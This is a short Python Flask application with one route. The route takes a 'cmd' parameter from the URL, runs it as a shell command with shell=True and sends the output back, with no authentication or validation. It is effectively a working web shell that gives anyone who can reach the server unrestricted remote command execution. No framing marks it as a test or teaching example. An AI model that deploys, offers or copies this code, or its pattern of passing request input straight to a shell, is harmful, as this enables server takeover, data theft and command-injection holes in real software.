from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/')
def shell():
    # Get the user's input
    user_input = request.args.get('cmd')
    # Run the input as a shell command and capture the output
    try:
        output = subprocess.check_output(user_input, shell=True)
        # Return the output to the user
        return output.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()

if __name__ == '__main__':
    app.run()

